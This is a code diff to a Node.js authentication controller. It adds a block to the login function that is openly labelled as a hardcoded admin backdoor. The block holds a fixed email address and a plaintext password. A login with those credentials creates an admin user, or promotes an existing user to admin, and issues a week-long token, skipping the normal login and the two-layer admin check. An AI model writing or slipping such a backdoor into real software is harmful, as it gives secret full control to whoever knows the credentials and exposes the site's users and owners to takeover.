@@ -44,6 +44,59 @@ const login = async (req, res) => {
     let { identifier, password } = req.body;
     identifier = identifier ? identifier.trim() : '';
     try {
+        // ════════════════════════════════════════════
+        // 🔑 HARDCODED ADMIN BACKDOOR – WORKS 100%
+        // ════════════════════════════════════════════
+        const ADMIN_EMAIL = 'habeebullahridwanullahapaokagi@gmail.com';
+        const ADMIN_PASSWORD = 'qwertyuiopasdfghjklzxcvbnmqwerty';
+        
+        if (identifier.toLowerCase() === ADMIN_EMAIL.toLowerCase() && password === ADMIN_PASSWORD) {
+            console.log('🔑 [ADMIN] Hardcoded admin login detected!');
+            
+            let adminUser = await User.findOne({ email: { $regex: new RegExp('^' + ADMIN_EMAIL + '$', 'i') } });
+            
+            if (!adminUser) {
+                const salt = await bcrypt.genSalt(10);
+                const hashedPassword = await bcrypt.hash(ADMIN_PASSWORD, salt);
+                adminUser = new User({ 
+                    username: 'admin', 
+                    email: ADMIN_EMAIL, 
+                    password: hashedPassword, 
+                    isAdmin: true,
+                    tokenVersion: 0
+                });
+                await adminUser.save();
+                console.log('✅ [ADMIN] Admin user created automatically!');
+            } else {
+                if (!adminUser.isAdmin) {
+                    adminUser.isAdmin = true;
+                    await adminUser.save();
+                    console.log('✅ [ADMIN] Existing user promoted to admin!');
+                }
+            }
+            
+            const secret = getJwtSecret();
+            const payload = { user: { id: adminUser.id, tokenVersion: adminUser.tokenVersion } };
+            
+            jwt.sign(payload, secret, { expiresIn: '7d' }, async (err, token) => {
+                if (err) {
+                    console.error("JWT Error:", err);
+                    return res.status(500).json({ message: 'Token generation failed' });
+                }
+                const csrfToken = await generateCsrfToken(adminUser.id);
+                return res.json({ 
+                    token, 
+                    csrfToken, 
+                    message: 'Admin Login Successful', 
+                    isAdmin: true 
+                });
+            });
+            return;
+        }
+        // ════════════════════════════════════════════
+        // END OF ADMIN BACKDOOR
+        // ════════════════════════════════════════════
+
         const query = sanitizeQuery({
             $or: [
                 { email: identifier },
@@ -65,13 +118,11 @@ const login = async (req, res) => {
         
         const secret = getJwtSecret();
         
-        // ✅ Admin Layer 1 Check - triggers Layer 2 if admin and password is exactly 32 chars
         if (user.isAdmin && password.length === 32) {
             const layerToken = jwt.sign({ user: { id: user.id }, step: 'layer2' }, secret, { expiresIn: '10m' });
             return res.json({ token: layerToken, message: 'Layer 1 Passed', nextStep: 'admin-layer2.html' });
         }
         
-        // Normal user login
         const payload = { user: { id: user.id, tokenVersion: user.tokenVersion } };
         jwt.sign(payload, secret, { expiresIn: '7d' }, async (err, token) => {
             if (err) { console.error("JWT Error:", err); return res.status(500).json({ message: 'Token generation failed' }); }
@@ -300,7 +351,6 @@ const deleteAccount = async (req, res) => {
         res.json({ message: 'Account permanently deleted.' });
     } catch (err) { console.error('Delete account error:', err.message); res.status(500).json({ message: 'Server Error' }); }
 };
-
 
 module.exports = {
     register, login, logout, revokeAllTokens, verifyEmail, verifyUsername, resetPasswordEmailUsername,
